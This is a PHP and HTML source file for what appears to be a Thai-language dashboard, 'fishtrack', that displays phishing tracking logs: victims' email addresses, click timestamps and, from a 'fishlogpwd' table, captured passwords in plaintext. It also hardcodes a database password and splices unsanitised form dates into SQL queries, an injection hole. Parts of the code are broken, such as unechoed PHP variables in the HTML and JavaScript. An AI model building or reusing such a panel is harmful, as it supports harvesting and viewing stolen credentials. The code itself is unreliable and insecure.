<?php
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
    ini_set('display_startup_errors', '1');
    $servername = "localhost";
    $username   = "tracker";
    $password   = "fishtracker67";
    $dbname     = "fishtrack";

    $conn = new mysqli($servername, $username, $password, $dbname);
    if($conn-> connect_errno){
        echo $conn->connect_errno.": ".$conn->connect_error;
    }

    $sql = "select fishlog.track_key, fishlog.datetime, emailaddr from fishlog inner join fishlist on fishlog.track_key = fishlist.track_key 
    order by fishlog.datetime asc;";
    $result = $conn->query($sql);

    $sql2 = "select count(*) from fishlog";
    $result2 = $conn->query($sql2);

    if($result2->num_rows > 0){
        while($row2=$result2->fetch_array()){
            $totalcount = $row2['count(*)'];
        }
    }
?>

<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tracking History | Automatic Mail</title>
    <link rel="stylesheet" href="fishtrackshow.css">
</head>
<body>
    <!-- Floating Particles -->
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1 class="page-title">🎯 Tracking History</h1>
        </div>

        <!-- Stats Cards -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon">📊</div>
                    <div class='stat-number' id='totalEmails'>$totalcount</div>
                <div class="stat-label">รายการทั้งหมด</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">✅</div>
                    <div class='stat-number' id='activeKeys'>5</div>
                <div class="stat-label">Active Keys</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">📅</div>
                <div class="stat-number" id="todayCount">2</div>
                <div class="stat-label">วันนี้</div>
            </div>
        </div>
        <div class="date-picker">
            <form action="fishtrackshow.php" method="post">
                <label for="birthdaytime">from:</label>
                <input type="date" id="startdate" name="startdate">
                <label for="birthdaytime">to:</label>
                <input type="date" id="enddate" name="enddate">
                <select id="dbtablesel" name="dbtablesel">
                    <option value=fishlog>fishlog</option>
                    <option value=fishlogpwd>fishlogpwd</option>
                </select>
                <input type="submit">
            </form>
        </div>
        
        <!-- Table -->
        <div class="table-container">
            <div class="table-header">
                <h2 class="table-title">รายการ Tracking</h2>
                <div class="search-box">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                    </svg>
                    <input type="text" placeholder="ค้นหา..." id="searchInput" onkeyup="searchTable()">
                </div>
            </div>

            <table class="email-table">
                <colgroup>
                    <col style="width: 25%;">
                    <col style="width: 45%;">
                    <col style="width: 30%;">
                </colgroup>
                <thead>
                    <tr>
                        <th>Datetime</th>
                        <th>Email</th>
                        <th>TakeKey</th>
                    </tr>
                </thead>
                <tbody id="emailTableBody">
                    <?php 
                        error_reporting(E_ALL);
                        ini_set('display_errors', '1');
                        ini_set('display_startup_errors', '1');
                        $dbtablesel = $_POST['dbtablesel'] ?? 'fishlog';
                        $startdate = trim($_POST['startdate'] ?? '');
                        $enddate = trim($_POST['enddate'] ?? '');
                        if($dbtablesel === 'fishlogpwd'){
                            if($startdate !== '' && $enddate !== ''){
                                $sql = "select fishlogpwd.track_key, fishlogpwd.datetime, emailaddr, fishlogpwd.password from fishlogpwd inner join fishlist on fishlogpwd.track_key = fishlist.track_key
                                where date(fishlogpwd.`datetime`) >= '$startdate' and date(fishlogpwd.`datetime`) <= '$enddate' order by fishlogpwd.datetime asc;";
                                $result = $conn->query($sql);
                                if($conn-> connect_errno){
                                        die($conn->connect_errno.": ".$conn->connect_error);
                                }
                                while($row=$result->fetch_array()){
                                    echo "<tr>";
                                    echo    "<td class='takekey-cell'>";
                                    echo        "<span class='date-cell'> ".$row['datetime']." </span>";
                                    echo    "</td>";
                                    echo    "<td>";
                                    echo        "<div class='email-cell'>";
                                    echo            "<div class='email-avatar'>S</div>";
                                    echo            "<span class='email-address'>".$row['emailaddr']."</span>";
                                    echo        "</div>";
                                    echo    "</td>";
                                    echo    "<td class='takekey-code'>".$row['track_key']."</td>";
                                    echo    "<td >".$row['password']."</td>";
                                    echo "</tr>";
                                }
                            }
                            else{
                                $sql = "select fishlogpwd.track_key, fishlogpwd.datetime, emailaddr, fishlogpwd.password from fishlogpwd inner join fishlist on fishlogpwd.track_key = fishlist.track_key
                                order by fishlogpwd.datetime asc;";
                                $result = $conn->query($sql);
                                if($conn-> connect_errno){
                                        die($conn->connect_errno.": ".$conn->connect_error);
                                }
                                while($row=$result->fetch_array()){
                                    echo "<tr>";
                                    echo    "<td class='takekey-cell'>";
                                    echo        "<span class='date-cell'> ".$row['datetime']." </span>";
                                    echo    "</td>";
                                    echo    "<td>";
                                    echo        "<div class='email-cell'>";
                                    echo            "<div class='email-avatar'>S</div>";
                                    echo            "<span class='email-address'>".$row['emailaddr']."</span>";
                                    echo        "</div>";
                                    echo    "</td>";
                                    echo    "<td class='takekey-code'>".$row['track_key']."</td>";
                                    echo    "<td >".$row['password']."</td>";
                                    echo "</tr>";
                                }

                            }
                        }
                        elseif($dbtablesel === 'fishlog'){
                            if($startdate !== '' && $enddate !== ''){
                                $sql3 = "select fishlog.track_key, fishlog.datetime, emailaddr from fishlog inner join fishlist on fishlog.track_key = fishlist.track_key
                                where date(fishlog.`datetime`) >= '$startdate' and date(fishlog.`datetime`) <= '$enddate' order by fishlog.datetime asc;";
                                $result3 = $conn->query($sql3);
                                while($row3=$result3->fetch_array()){
                                    echo "<tr>";
                                    echo    "<td class='takekey-cell'>";
                                    echo        "<span class='date-cell'> ".$row3['datetime']." </span>";
                                    echo    "</td>";
                                    echo    "<td>";
                                    echo        "<div class='email-cell'>";
                                    echo            "<div class='email-avatar'>S</div>";
                                    echo            "<span class='email-address'>".$row3['emailaddr']."</span>";
                                    echo        "</div>";
                                    echo    "</td>";
                                    echo    "<td class='date-cell'>".$row3['track_key']."</td>";
                                    echo "</tr>";
                                }
                            }elseif($result->num_rows > 0){
                                while($row=$result->fetch_array()){
                                    echo "<tr>";
                                    echo    "<td class='takekey-cell'>";
                                    echo        "<span class='takekey-code'> ".$row['datetime']." </span>";
                                    echo    "</td>";
                                    echo    "<td>";
                                    echo        "<div class='email-cell'>";
                                    echo            "<div class='email-avatar'>S</div>";
                                    echo            "<span class='email-address'>".$row['emailaddr']."</span>";
                                    echo        "</div>";
                                    echo    "</td>";
                                    echo    "<td class='date-cell'>".$row['track_key']."</td>";
                                    echo "</tr>";
                                }
                            }   
                        }
                    ?>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        // Search table
        function searchTable() {
            const input = document.getElementById('searchInput');
            const filter = input.value.toLowerCase();
            const tbody = document.getElementById('emailTableBody');
            const rows = tbody.getElementsByTagName('tr');

            for (let row of rows) {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(filter) ? '' : 'none';
            }
        }

        // Update stats
        function updateStats() {
            const tbody = document.getElementById('emailTableBody');
            const rows = tbody.querySelectorAll('tr');
            document.getElementById('totalEmails').textContent = rows.length;
            document.getElementById('activeKeys').textContent = rows.length;
        }

        // Check empty table
        function checkEmptyTable() {
            const tbody = document.getElementById('emailTableBody');
            if (tbody.children.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="3">
                            <div class="empty-state">
                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4" />
                                </svg>
                                <h3>ยังไม่มีข้อมูล</h3>
                                <p>ยังไม่มีการบันทึกข้อมูล Tracking</p>
                            </div>
                        </td>
                    </tr>
                `;
            }
        }

        // Animated counter
        function animateCounter(element, target) {
            let current = 0;
            const increment = target / 30;
            const timer = setInterval(() => {
                current += increment;
                if (current >= target) {
                    element.textContent = target;
                    clearInterval(timer);
                } else {
                    element.textContent = Math.floor(current);
                }
            }, 30);
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            updateStats();
            
            // Animate numbers
            const totalEl = document.getElementById('totalEmails');
            const activeEl = document.getElementById('activeKeys');
            const todayEl = document.getElementById('todayCount');
            
            animateCounter(totalEl, $totalcount);
            animateCounter(activeEl, 5);
            animateCounter(todayEl, 2);
        });
    </script>
</body>
</html>
